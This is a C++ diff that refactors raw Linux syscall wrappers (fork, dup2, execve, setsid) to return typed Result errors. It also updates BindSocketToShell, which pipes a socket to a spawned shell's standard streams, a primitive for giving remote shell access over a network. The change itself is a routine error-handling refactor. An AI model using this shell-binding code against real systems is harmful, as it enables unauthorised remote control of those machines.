@@ -9,67 +9,92 @@
 #include "system.h"
 
 // Fork syscall wrapper
-SSIZE Process::Fork() noexcept
+Result<SSIZE, Error> Process::Fork() noexcept
 {
 #if defined(ARCHITECTURE_AARCH64)
     // aarch64 uses clone with SIGCHLD flag for fork-like behavior
     constexpr USIZE SIGCHLD = 17;
-    return System::Call(SYS_CLONE, SIGCHLD, 0, 0, 0, 0);
+    SSIZE result = System::Call(SYS_CLONE, SIGCHLD, 0, 0, 0, 0);
 #else
-    return System::Call(SYS_FORK);
+    SSIZE result = System::Call(SYS_FORK);
 #endif
+    if (result < 0)
+    {
+        return Result<SSIZE, Error>::Err(Error::Posix((UINT32)(-result)), Error::Process_ForkFailed);
+    }
+    return Result<SSIZE, Error>::Ok(result);
 }
 
 // Dup2 syscall wrapper
-SSIZE Process::Dup2(SSIZE oldfd, SSIZE newfd) noexcept
+Result<SSIZE, Error> Process::Dup2(SSIZE oldfd, SSIZE newfd) noexcept
 {
 #if defined(ARCHITECTURE_AARCH64)
     // aarch64 uses dup3 with flags=0 instead of dup2
-    return System::Call(SYS_DUP3, (USIZE)oldfd, (USIZE)newfd, 0);
+    SSIZE result = System::Call(SYS_DUP3, (USIZE)oldfd, (USIZE)newfd, 0);
 #else
-    return System::Call(SYS_DUP2, (USIZE)oldfd, (USIZE)newfd);
+    SSIZE result = System::Call(SYS_DUP2, (USIZE)oldfd, (USIZE)newfd);
 #endif
+    if (result < 0)
+    {
+        return Result<SSIZE, Error>::Err(Error::Posix((UINT32)(-result)), Error::Process_Dup2Failed);
+    }
+    return Result<SSIZE, Error>::Ok(result);
 }
 
 // Execve syscall wrapper
-SSIZE Process::Execve(const CHAR *pathname, CHAR *const argv[], CHAR *const envp[]) noexcept
+Result<SSIZE, Error> Process::Execve(const CHAR *pathname, CHAR *const argv[], CHAR *const envp[]) noexcept
 {
-    return System::Call(SYS_EXECVE, (USIZE)pathname, (USIZE)argv, (USIZE)envp);
+    SSIZE result = System::Call(SYS_EXECVE, (USIZE)pathname, (USIZE)argv, (USIZE)envp);
+    if (result < 0)
+    {
+        return Result<SSIZE, Error>::Err(Error::Posix((UINT32)(-result)), Error::Process_ExecveFailed);
+    }
+    return Result<SSIZE, Error>::Ok(result);
 }
 
 // Setsid syscall wrapper
-SSIZE Process::Setsid() noexcept
+Result<SSIZE, Error> Process::Setsid() noexcept
 {
-    return System::Call(SYS_SETSID);
+    SSIZE result = System::Call(SYS_SETSID);
+    if (result < 0)
+    {
+        return Result<SSIZE, Error>::Err(Error::Posix((UINT32)(-result)), Error::Process_SetsidFailed);
+    }
+    return Result<SSIZE, Error>::Ok(result);
 }
 
 // BindSocketToShell - Main function to bind a socket to a shell process
-SSIZE Process::BindSocketToShell(SSIZE socketFd, const CHAR *cmd) noexcept
+Result<SSIZE, Error> Process::BindSocketToShell(SSIZE socketFd, const CHAR *cmd) noexcept
 {
     if (socketFd < 0 || cmd == nullptr)
     {
-        return PROCESS_INVALID_PID;
+        return Result<SSIZE, Error>::Err(Error::Process_BindShellFailed);
     }
 
-    SSIZE pid = Fork();
+    auto forkResult = Fork();
 
-    if (pid < 0)
+    if (forkResult.IsErr())
     {
         // Fork failed
-        return PROCESS_INVALID_PID;
+        return Result<SSIZE, Error>::Err(forkResult, Error::Process_BindShellFailed);
     }
+
+    SSIZE pid = forkResult.Value();
 
     if (pid == 0)
     {
         // Child process
 
         // Create new session (detach from controlling terminal)
-        Setsid();
+        (void)Setsid();
 
         // Redirect stdin/stdout/stderr to socket
-        Dup2(socketFd, STDIN_FILENO);
-        Dup2(socketFd, STDOUT_FILENO);
-        Dup2(socketFd, STDERR_FILENO);
+        if (Dup2(socketFd, STDIN_FILENO).IsErr() ||
+            Dup2(socketFd, STDOUT_FILENO).IsErr() ||
+            Dup2(socketFd, STDERR_FILENO).IsErr())
+        {
+            System::Call(SYS_EXIT, 1);
+        }
 
         // Close original socket fd if it's not one of the standard fds
         if (socketFd > STDERR_FILENO)
@@ -88,12 +113,12 @@ SSIZE Process::BindSocketToShell(SSIZE socketFd, const CHAR *cmd) noexcept
         envp[0] = nullptr;
 
         // Execute the command - this should not return
-        Execve(cmd, argv, envp);
+        (void)Execve(cmd, argv, envp);
 
         // If execve returns, something went wrong - exit child
         System::Call(SYS_EXIT, 1);
     }
 
     // Parent process - return child PID
-    return pid;
+    return Result<SSIZE, Error>::Ok(pid);
 }
